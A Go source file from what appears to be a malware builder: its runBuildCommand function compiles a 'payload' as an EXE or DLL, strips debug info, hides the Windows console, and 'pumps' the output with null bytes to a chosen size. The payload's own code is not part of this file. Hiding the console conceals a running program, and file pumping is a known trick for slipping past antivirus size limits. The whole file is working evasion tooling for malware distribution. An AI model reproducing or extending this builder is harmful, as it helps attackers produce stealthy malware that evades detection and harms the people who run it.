package builder

import (
	"bytes"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

func runBuildCommand(tempDir, outputPath string, options BuildOptions) (stdout, stderr string, err error) {
	outputDir := filepath.Dir(outputPath)
	if err := os.MkdirAll(outputDir, 0755); err != nil {
		return "", "", fmt.Errorf("failed to create output directory: %v", err)
	}
	log.Printf("[BUILDER] Ensured output directory exists: %s", outputDir)
	testFile := filepath.Join(outputDir, "test.txt")
	if err := os.WriteFile(testFile, []byte("test"), 0644); err != nil {
		return "", "", fmt.Errorf("output directory is not writable: %v", err)
	}
	os.Remove(testFile)
	log.Printf("[BUILDER] Verified output directory is writable")

	args := []string{"build"}
	ldflags := []string{}

	if options.OutputFormat == "dll" {
		log.Printf("[BUILDER] Building DLL payload")
		args = append(args, "-buildmode=c-shared")
	} else {
		log.Printf("[BUILDER] Building EXE payload")
	}

	if options.StripDebug {
		log.Printf("[BUILDER] Debug info stripping enabled")
		ldflags = append(ldflags, "-s", "-w")
	}
	if options.HideConsole && runtime.GOOS == "windows" && options.OutputFormat != "dll" {
		log.Printf("[BUILDER] Console hiding enabled")
		ldflags = append(ldflags, "-H=windowsgui")
	}
	if len(ldflags) > 0 {
		ldflagsStr := strings.Join(ldflags, " ")
		log.Printf("[BUILDER] Using ldflags: %s", ldflagsStr)
		args = append(args, "-ldflags", ldflagsStr)
	}
	args = append(args, "-o", outputPath)
	args = append(args, ".")
	log.Printf("[BUILDER] Running build command: go %v", args)
	log.Printf("[BUILDER] Build working directory: %s", tempDir)
	cmd := exec.Command("go", args...)
	cmd.Dir = tempDir

	cmd.Env = append(os.Environ(),
		"CGO_ENABLED=1",
		"GOOS="+runtime.GOOS,
		"GOARCH="+runtime.GOARCH,
	)
	var stdoutBuf, stderrBuf bytes.Buffer
	cmd.Stdout = &stdoutBuf
	cmd.Stderr = &stderrBuf
	err = cmd.Run()
	stdout = stdoutBuf.String()
	stderr = stderrBuf.String()
	if len(stdout) > 0 {
		log.Printf("[BUILDER] Build stdout:\n%s", stdout)
	}
	if len(stderr) > 0 {
		log.Printf("[BUILDER] Build stderr:\n%s", stderr)
	}

	if err != nil {
		return stdout, stderr, fmt.Errorf("build command failed: %v\nStdout: %s\nStderr: %s", err, stdout, stderr)
	}
	if _, err := os.Stat(outputPath); os.IsNotExist(err) {
		return stdout, stderr, fmt.Errorf("build failed - output file not found at: %s", outputPath)
	}
	log.Printf("[BUILDER] Successfully verified output file exists at: %s", outputPath)

	if options.PumpEnabled && options.PumpSize > 0 {
		var targetSize int64
		switch strings.ToUpper(options.PumpUnit) {
		case "KB":
			targetSize = int64(options.PumpSize * 1024)
		case "MB":
			targetSize = int64(options.PumpSize * 1024 * 1024)
		case "GB":
			targetSize = int64(options.PumpSize * 1024 * 1024 * 1024)
		default:
			targetSize = int64(options.PumpSize)
		}
		fileInfo, err := os.Stat(outputPath)
		if err != nil {
			return stdout, stderr, fmt.Errorf("failed to get file size: %v", err)
		}
		currentSize := fileInfo.Size()
		if targetSize > currentSize {
			bytesToAdd := targetSize - currentSize
			log.Printf("[BUILDER] Pumping file from %d bytes to %d bytes (adding %d nullbytes)", currentSize, targetSize, bytesToAdd)
			file, err := os.OpenFile(outputPath, os.O_APPEND|os.O_WRONLY, 0644)
			if err != nil {
				return stdout, stderr, fmt.Errorf("failed to open file for pumping: %v", err)
			}
			defer file.Close()
			const chunkSize = 1024 * 1024
			nullbyte := []byte{0}
			remaining := bytesToAdd
			for remaining > 0 {
				if remaining < chunkSize {
					for i := int64(0); i < remaining; i++ {
						if _, err := file.Write(nullbyte); err != nil {
							return stdout, stderr, fmt.Errorf("failed to write nullbytes: %v", err)
						}
					}
					remaining = 0
				} else {
					chunk := make([]byte, chunkSize)
					if _, err := file.Write(chunk); err != nil {
						return stdout, stderr, fmt.Errorf("failed to write nullbytes: %v", err)
					}
					remaining -= chunkSize
				}
			}

			log.Printf("[BUILDER] Successfully pumped file to %d bytes", targetSize)
		} else {
			log.Printf("[BUILDER] Target size %d bytes is smaller than current size %d bytes, skipping pump", targetSize, currentSize)
		}
	}

	return stdout, stderr, nil
}

func joinArgs(args []string) string {
	var result string
	for i, arg := range args {
		if i > 0 {
			result += " "
		}
		if containsSpace := strings.Contains(arg, " "); containsSpace {
			result += `"` + arg + `"`
		} else {
			result += arg
		}
	}
	return result
}
